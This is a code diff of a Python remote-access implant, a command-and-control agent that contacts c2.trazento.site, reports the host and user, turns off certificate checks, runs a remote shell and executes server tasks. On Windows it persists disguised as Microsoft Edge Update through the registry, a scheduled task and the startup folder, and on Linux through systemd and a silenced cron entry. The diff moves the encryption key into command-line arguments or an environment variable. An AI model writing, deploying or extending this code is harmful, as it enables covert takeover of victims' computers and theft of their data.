@@ -1,7 +1,4 @@
 #!/usr/bin/env python3
-"""
-C2 Agent - standalone, zero deps, PTY shell, cross-platform, reboot survival
-"""
 import base64
 import hashlib
 import hmac
@@ -20,17 +17,15 @@ import urllib.error
 
 SERVER = "https://c2.trazento.site"
 AID = None
+TOKEN = None
 KEY = None
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
 INTERVAL = 5
-
-# ─── PTY shell state ─────────────────────────────────────────────────
 SH_FD = None
 SH_PID = None
 SH_BUF = []
 SH_LOCK = threading.Lock()
 
-# ─── crypto (stdlib only) ───────────────────────────────────────────
 def _expand(secret, iv, n):
     k = hmac.new(secret, iv, hashlib.sha256).digest()
     out = b""
@@ -56,50 +51,30 @@ def decrypt(data, key=None):
     p = bytes(a ^ b for a, b in zip(ct, _expand(k, iv, len(ct))))
     return p.decode()
 
-# ─── network ─────────────────────────────────────────────────────────
 def _req(url, data):
     body = json.dumps(data).encode() if data else None
     hdrs = {"Content-Type": "application/json", "User-Agent": UA}
     return urllib.request.Request(url, data=body, headers=hdrs)
 
-def _open(req, ssl_ok):
+def _open(req):
     try:
-        if ssl_ok:
-            import ssl as _s
-            ctx = _s.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = _s.CERT_NONE
-            return urllib.request.urlopen(req, context=ctx, timeout=10)
-        return urllib.request.urlopen(req, timeout=10)
+        import ssl as _s
+        ctx = _s.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = _s.CERT_NONE
+        return urllib.request.urlopen(req, context=ctx, timeout=10)
     except Exception:
         return None
 
-def sync_key(resp):
-    if resp and "key" in resp:
-        global KEY
-        KEY = base64.b64decode(resp["key"].encode())
-
 def api(url, data=None):
     try:
-        r = _open(_req(url, data), True)
+        r = _open(_req(url, data))
         if r:
-            resp = json.loads(r.read().decode())
-            sync_key(resp)
-            return resp
-    except Exception:
-        pass
-    try:
-        u = url.replace("https://", "http://")
-        r = _open(_req(u, data), False)
-        if r:
-            resp = json.loads(r.read().decode())
-            sync_key(resp)
-            return resp
+            return json.loads(r.read().decode())
     except Exception:
         pass
     return None
 
-# ─── shell (PTY on Linux, pipe on Windows) ─────────────────────────
 IS_WIN = platform.system() == "Windows"
 
 if IS_WIN:
@@ -226,17 +201,8 @@ else:
         SH_FD = None
         SH_PID = None
 
-# ─── core ────────────────────────────────────────────────────────────
-def get_key():
-    global KEY
-    r = api(f"{SERVER}/api/key")
-    if r and "key" in r:
-        KEY = base64.b64decode(r["key"].encode())
-        return True
-    return False
-
 def register():
-    global AID
+    global AID, TOKEN
     info = {
         "hostname": socket.gethostname(),
         "user": os.environ.get("USER", "?"),
@@ -245,6 +211,7 @@ def register():
     r = api(f"{SERVER}/api/login", {"cipher": encrypt(json.dumps(info))})
     if r and "agent_id" in r:
         AID = r["agent_id"]
+        TOKEN = r.get("token", "")
         return r.get("interval", 5)
     return 5
 
@@ -329,7 +296,6 @@ def do_task(t):
 
     return res
 
-# ─── persistence ─────────────────────────────────────────────────────
 SERVICE_TEMPLATE = """[Unit]
 Description=C2 Agent
 After=network.target
@@ -349,10 +315,14 @@ def install_persistence():
     srv = SERVER
     is_win = platform.system() == "Windows"
     is_frozen = getattr(sys, 'frozen', False)
+    key_b64 = base64.b64encode(KEY).decode() if KEY else ""
 
     if not is_win:
-        exec_cmd = agent_path if is_frozen else f"{sys.executable} {agent_path}"
-        svc = SERVICE_TEMPLATE.format(exec_cmd=f"{exec_cmd} --server {srv}")
+        if is_frozen:
+            exec_cmd = f"{agent_path} --key {key_b64} --server {srv}"
+        else:
+            exec_cmd = f"{sys.executable} {agent_path} --key {key_b64} --server {srv}"
+        svc = SERVICE_TEMPLATE.format(exec_cmd=exec_cmd)
         local_path = os.path.join(os.path.dirname(agent_path), "c2-agent.service")
         with open(local_path, "w") as f:
             f.write(svc)
@@ -370,7 +340,7 @@ def install_persistence():
             print(f"    sudo cp {local_path} /etc/systemd/system/c2-agent.service")
             print(f"    sudo systemctl daemon-reload && sudo systemctl enable c2-agent && sudo systemctl start c2-agent")
 
-        cron = f"@reboot {exec_cmd} &"
+        cron = f"@reboot {exec_cmd} >/dev/null 2>&1 &"
         try:
             existing = subprocess.run("crontab -l 2>/dev/null", shell=True, capture_output=True, text=True).stdout
             if cron in existing:
@@ -382,7 +352,6 @@ def install_persistence():
         except Exception as e:
             print(f"[!] crontab fail: {e}")
     else:
-        # Windows: copy to AppData, registry + schtasks + startup folder
         import shutil
         local_appdata = os.environ.get("LOCALAPPDATA", os.environ.get("APPDATA", os.path.expanduser("~")))
         hide_dir = os.path.join(local_appdata, "Microsoft", "EdgeUpdate")
@@ -398,7 +367,7 @@ def install_persistence():
             if ok:
                 print(f"[+] Windows persistence: {target}")
             else:
-                print(f"[!] Windows persistence FAILED — check {log_file}")
+                print(f"[!] Windows persistence FAILED \u2014 check {log_file}")
         except Exception as e:
             msg = f"[!] Windows install fail: {e}"
             print(msg)
@@ -410,17 +379,17 @@ def install_persistence():
 
 def _win_persistence_install(target, log_file):
     ok = False
+    key_b64 = base64.b64encode(KEY).decode() if KEY else ""
     try:
         with open(log_file, "w") as lf:
             lf.write(f"target={target}\n")
     except Exception:
         pass
-    # 1) Registry Run key
     try:
         import winreg
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
             r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        val = f'"{target}" --no-install'
+        val = f'"{target}" --key {key_b64} --no-install'
         winreg.SetValueEx(key, "MicrosoftEdgeUpdate", 0, winreg.REG_SZ, val)
         winreg.CloseKey(key)
         ok = True
@@ -429,9 +398,8 @@ def _win_persistence_install(target, log_file):
     except Exception as e:
         with open(log_file, "a") as lf:
             lf.write(f"REGISTRY FAIL: {e}\n")
-    # 2) schtasks (user-level, no admin)
     try:
-        cmd = f'schtasks /create /tn "MicrosoftEdgeUpdate" /tr "\'{target}\' --no-install" /sc onlogon /rl limited /f'
+        cmd = f'schtasks /create /tn "MicrosoftEdgeUpdate" /tr "\'{target}\' --key {key_b64} --no-install" /sc onlogon /rl limited /f'
         subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
         with open(log_file, "a") as lf:
             lf.write(f"SCHTASKS OK\n")
@@ -439,14 +407,13 @@ def _win_persistence_install(target, log_file):
     except Exception as e:
         with open(log_file, "a") as lf:
             lf.write(f"SCHTASKS FAIL: {e}\n")
-    # 3) Startup folder (batch file)
     try:
         startup = os.path.join(os.environ.get("APPDATA", ""),
             "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         if startup and os.path.isdir(startup):
             bat = os.path.join(startup, "MicrosoftEdgeUpdate.bat")
             with open(bat, "w") as f:
-                f.write(f'@start "" /b "{target}" --no-install\n')
+                f.write(f'@start "" /b "{target}" --key {key_b64} --no-install\n')
             with open(log_file, "a") as lf:
                 lf.write(f"STARTUP OK: {bat}\n")
             ok = True
@@ -458,7 +425,7 @@ def _win_persistence_install(target, log_file):
 def remove_persistence():
     if platform.system() != "Windows":
         try:
-            subprocess.run("crontab -l 2>/dev/null | grep -v c2_agent | crontab -", shell=True, check=True)
+            subprocess.run("crontab -l 2>/dev/null | grep -v 'c2_agent' | crontab -", shell=True, check=True)
             print("[+] crontab removed")
         except Exception:
             pass
@@ -498,9 +465,8 @@ def remove_persistence():
                 pass
         print("[+] Windows persistence removed")
 
-# ─── main ────────────────────────────────────────────────────────────
 def main():
-    global SERVER, INTERVAL
+    global SERVER, INTERVAL, KEY
     want_install = False
     want_remove = False
     no_install = False
@@ -510,6 +476,9 @@ def main():
         a = sys.argv[i]
         if a == "--server" and i + 1 < len(sys.argv):
             SERVER = sys.argv[i + 1]; i += 2
+        elif a == "--key" and i + 1 < len(sys.argv):
+            KEY = base64.b64decode(sys.argv[i + 1].encode())
+            i += 2
         elif a == "--install":
             want_install = True; i += 1
         elif a == "--remove":
@@ -521,19 +490,21 @@ def main():
         else:
             i += 1
 
+    if not KEY:
+        env_key = os.environ.get("C2_KEY", "")
+        if env_key:
+            KEY = base64.b64decode(env_key.encode())
+
+    if not KEY:
+        print("[agent] ERROR: no encryption key. Provide --key <base64> or C2_KEY env var")
+        sys.exit(1)
+
     if want_install:
         install_persistence(); return
     if want_remove:
         remove_persistence(); return
 
     print(f"[agent] {SERVER}")
-    for attempt in range(999):
-        if get_key():
-            break
-        print(f"[agent] key fail (attempt {attempt+1}), retry in 10s")
-        time.sleep(10)
-    else:
-        return
     for attempt in range(999):
         INTERVAL = register()
         if AID:
@@ -548,27 +519,23 @@ def main():
 
     poll_count = 0
     while True:
-        # flush PTY output if shell active
         if SH_FD is not None:
             so = shell_flush()
             if so:
-                send_result({"task_id": -1, "type": "shell_output", "output": {"stdout": so, "stderr": "", "code": 0}})
+                ok = send_result({"task_id": -1, "type": "shell_output", "output": {"stdout": so, "stderr": "", "code": 0}})
+                if ok is None:
+                    with SH_LOCK:
+                        SH_BUF.insert(0, so.encode())
 
-        # poll for tasks
         tasks, ni, known = poll()
         if ni:
             INTERVAL = ni
 
-        # re-register if server doesn't know our AID (server restarted)
         if not known:
-            get_key()
             INTERVAL = register()
             if not AID:
                 print("[agent] re-register fail")
-        else:
-            pass  # server knows us, normal operation
 
-        # active shell mode: poll faster
         sleep_time = INTERVAL
         for t in tasks:
             r = do_task(t)
@@ -587,14 +554,11 @@ def main():
             RECONNECT = False
             print("[agent] reconnecting...")
             poll_count = 0
-            # re-register
-            get_key()
             INTERVAL = register()
             if not AID:
                 print("[agent] re-register fail")
             continue
 
-        # if shell active, poll faster
         if SH_FD is not None:
             sleep_time = 0.5
 
